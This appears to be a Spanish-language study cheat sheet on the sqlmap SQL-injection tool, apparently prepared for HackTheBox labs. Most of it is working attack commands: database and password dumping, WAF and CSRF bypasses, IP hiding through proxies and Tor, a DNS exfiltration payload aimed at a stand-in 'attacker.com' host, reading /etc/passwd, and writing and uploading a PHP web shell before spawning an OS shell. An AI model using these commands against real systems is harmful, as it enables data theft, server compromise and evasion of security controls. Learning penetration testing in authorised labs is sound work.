## Descripción 
Podemos encontrar el manual de uso de la herramienta, con ejemplos [aquí](https://github.com/sqlmapproject/sqlmap/wiki/usage). Aquí está [github sqlmap](https://github.com/sqlmapproject/sqlmap/)
Es una herramienta de automatización para **detectar y explotar vulnerabilidades de inyección SQL**. Permite identificar parámetros inyectables, extraer bases de datos, tablas y datos, y en algunos casos realizar acciones avanzadas sobre el sistema gestor. Podemos mostrar ayuda del siguiente modo: 
```bash
# Ayuda breve
sqlmap -h
## Ayuda avanzada
sqlmap -hh
```
### Algunas de las queries que puede realizar (`--technique=TECH...`)
- **`B` — Boolean-based blind**  
    Se basa en distinguir respuestas **TRUE/FALSE** comparando cambios en el contenido, código HTTP, título, texto filtrado, etc.  
    **Idea:** extrae información bit a bit o byte a byte según cómo cambie la respuesta.
    
- **`E` — Error-based**  
    Aprovecha **mensajes de error del DBMS** para forzar que la propia base de datos devuelva datos útiles dentro del error.  
    **Idea:** es bastante rápida porque puede extraer fragmentos de datos en cada request.
    
- **`U` — UNION query-based**  
    Usa `UNION SELECT` para **añadir resultados propios** a la consulta original y hacer que aparezcan en la respuesta de la aplicación.  
    **Idea:** suele ser la técnica más rápida cuando la salida de la query se refleja en la página.
    
- **`S` — Stacked queries**  
    Inyecta **consultas adicionales separadas** de la original, normalmente usando `;`.  
    **Idea:** permite ejecutar sentencias no orientadas a lectura, como `INSERT`, `UPDATE`, `DELETE`, e incluso acciones más avanzadas según el motor.
    
- **`T` — Time-based blind**  
    Diferencia entre verdadero y falso mediante **retardos en la respuesta**, por ejemplo usando `SLEEP()`.  
    **Idea:** útil cuando no hay cambios visibles en la respuesta, pero sí se puede medir el tiempo.
    
- **`Q` — Inline queries**  
    Inserta una **subconsulta dentro de la consulta original**.  
    **Idea:** es menos común y depende mucho de cómo esté construida la query vulnerable en la aplicación.
- `OOB` - Out of band
	Es una técnica en la que la extracción de datos no se hace por la respuesta HTTP normal, sino por un **canal externo**, típicamente **DNS**. Ejemplo de consulta 
	```sql
	LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
	```

## Chuleta htb
| **Command**                                                                                                               | **Description**                                             |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
| `sqlmap -u "http://www.example.com/" --crawl=2`                                                                           | Crawl the target website to discover links and parameters   |
| `sqlmap -u "http://www.example.com/login" --forms`                                                                        | Parse and test HTML forms found on the target page          |
| `sqlmap -u "http://www.example.com/login" --proxy http://127.0.0.1:8080`                                                  |                                                             |
## Construyendo ataques
### Pasos típicos
```bash
# Enumerar las bases de datos disponibles en el servidor
sqlmap -u "http://target/?id=1" --dbs

# Mostrar la base de datos actual en uso
sqlmap -u "http://target/?id=1" --current-db

# Enumerar las tablas de la base de datos 'testdb'
sqlmap -u "http://target/?id=1" --tables -D testdb

# Enumerar las columnas de la tabla 'users' dentro de la base de datos 'testdb'
sqlmap -u "http://target/?id=1" --columns -D testdb -T users

# Volcar todo el contenido de la tabla 'users' de la base de datos 'testdb'
sqlmap -u "http://target/?id=1" --dump -D testdb -T users

# Volcar solo las columnas 'username' y 'password' de la tabla 'users'
sqlmap -u "http://target/?id=1" --dump -D testdb -T users -C username,password

# Volcar únicamente las filas de 'users' donde username sea 'admin'
sqlmap -u "http://target/?id=1" --dump -D testdb -T users --where="username='admin'"

# Volcar usuarios que estén en la 2a y 3a columna
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

```


### Curl
Podemos copiar una petición desde herramientas del navegador como `Copy>Copy as cURL` y tras cambiar curl por sqlmap, sqlmap detecta todos los parámetros de curl y hace la petición del siguiente modo:
```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```
## GET/POST
Funciona similar a curl, si no añadimos información es petición GET, pero si queremos que la aplicación sea POST, podemos añadir la flag `--data` . Ejemplo
```bash
# Petición post
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
# Petición en la que estamos casi seguros de que el parámetro uid es vulnerable
sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
# Petción en la que no queremos que se haga fuzzing sobre el parámetro uid
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```
### Full HTTP Requests
Se puede guardar una petición desde burp y guardar en un archivo manualmente o botón derecho `>Copy to file`. También se puede desde dev tools y `Copy> Copy request headers`. Después basta utilizar sqlmap con la flag `-r`
```bash
sqlmap -r req.txt
```
### `--level/risk`
Según el nivel que se introduce, se intenta hacer inyección SQL en distintos parámetros, p.ej: `--level=2` intenta SQLi sobre Cookies y `--level=3`  en `User-Agent` y el `--level=5` intenta `Host` header
```
sqlmap -r req3 --level=2 --dump -T flag3 -D testdb --proxy 127.0.0.1:8080
```
Por defecto se inicia con  `--level=1 --risk=1`, que incluye un total de 72 payloads para cada parámetro, mientras que  `--level=5 --risk=3` llega a probar hasta 7865 payloads.
Hay un laboratorio en el que solo se ha conseguido la flag con el mayor nivel de riesgo

### Prefix/Suffix
Puede ser útil si conocemos la query exacta que se realiza en el backend ó hemos encontrado específicamente la cadena que genera SQLi. Por ejemplo
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
si sabemos que la query que se está realizando es del tipo: 
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1"; $result = mysqli_query($link, $query);
```

## Bypass de protecciones
### Anti-CSRF token
Renueva automáticamente tokens anti-CSRF en peticiones protegidas mediante `--csrf-token`, evitando que fallen por usar un token caducado o reutilizado. Si detecta nombres de parámetros habituales como `csrf`, `xsrf` o `token`, puede sugerir automáticamente su gestión dinámica.
```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
### Bypass de valores únicos
Podemos utilizar `--randomize` para cambiar automáticamente un parámetro en cada request y así evadir controles simples basados en valores repetidos.
```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```
### Bypass de parámetros calculados
Algunas aplicaciones validan parámetros derivados, como hashes o checksums. Si no se recalculan correctamente al modificar la petición, la explotación falla aunque exista SQLi. En estos escenarios, **la dificultad está en reproducir correctamente la lógica de la aplicación**
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

### Ocultación de la IP

SQLMap puede enrutar peticiones a través de un proxy con `--proxy`, usar una lista de proxys con `--proxy-file`, o apoyarse en la red Tor mediante `--tor`. Si se quiere verificar que Tor está funcionando realmente, puede usarse `--check-tor`.

```bash
sqlmap -u "http://www.example.com/?id=1" --proxy="socks4://177.39.187.70:33283"
sqlmap -u "http://www.example.com/?id=1" --proxy-file=proxies.txt
sqlmap -u "http://www.example.com/?id=1" --proxy-file=proxies.txt
```

### WAF Bypass

SQLMap utiliza payloads con aspecto malicioso para detectar si hay un WAF. Si detecta una posible protección, puede apoyarse en  [identYwaf](https://github.com/stamparm/identYwaf) para tratar de identificar que WAF está delante del objetivo. Podemos evitar la búsqueda de WAF (p.ej: producir menos ruido), podemos utilizar el parámetro `--skip-waf`


### User-agent Blacklisting Bypass

SQLMap utiliza por defecto un `User-Agent` reconocible, por lo que algunos entornos pueden devolver errores automáticamente. Para evitar este bloqueo, puede utilizarse `--random-agent`, que sustituye el `User-Agent` por uno elegido al azar de navegadores clásicos. 

### Tamper Scripts

Son especialmente útiles cuando la inyección existe pero ciertos patrones como `UNION`, `SELECT`, `=` o `>` son detectados y bloqueados por filtros simples. Los tamper scripts son scripts en Python con el objetivo de evitar bloqueos por WAFs. Pueden encadenarse con `--tamper`, y podemos ver una lista con la flag `--list-tampers`.
```bash
sqlmap -u "http://www.example.com/?id=1" --tamper=between,randomcase
```
### Miscellaneous Bypasses

#### Transferencia HTTP chunked

Con la opción `--chunked`, SQLMap envía el cuerpo de la petición POST usando codificación `Transfer-Encoding: chunked`, es decir, dividido en fragmentos. Puede ayudar a evadir algunos filtros o inspecciones superficiales
```bash
sqlmap -u "http://www.example.com/" --data="id=1" --chunked
```
#### HPP
El HTTP Parameter Pollution consiste en dividir un payload entre varios parámetros con el mismo nombre, confiando en que la plataforma de destino los concatene o los procese de una forma útil para el atacante
```bash
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

## OS Explotation

### Leer ficheros locales
Para leer/escribir ficheros o ejecutar comandos con SQLMap suelen hacer falta **privilegios altos en el DBMS** y que el motor soporte primitivas de acceso al sistema. `--is-dba` es una buena comprobación inicial, pero no es una garantía absoluta ni una condición universal en todos los casos
```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```
Si aparece true es posible que podamos tener una vía para leer ficheros locales con la flag `--file-read`. Ejemplo: 
```bash
#Linux
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
# Windows
sqlmap -u "http://www.example.com/?id=1" --file-read "C:/Windows/win.ini"
```

### Escribir en archivos locales
Con `--file-write` y `--file-dest`, SQLMap puede subir un fichero local desde la máquina atacante al sistema de ficheros del servidor, siempre que el DBMS lo soporte y existan permisos suficientes.
```bash
# Creación de shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Subida de shell
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

### Command execution
También tiene la opción de intentar ejecutar comandos de forma remota tratando de subir revshells o utilizando consultas como `xp_cmdshell` en mssql
```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```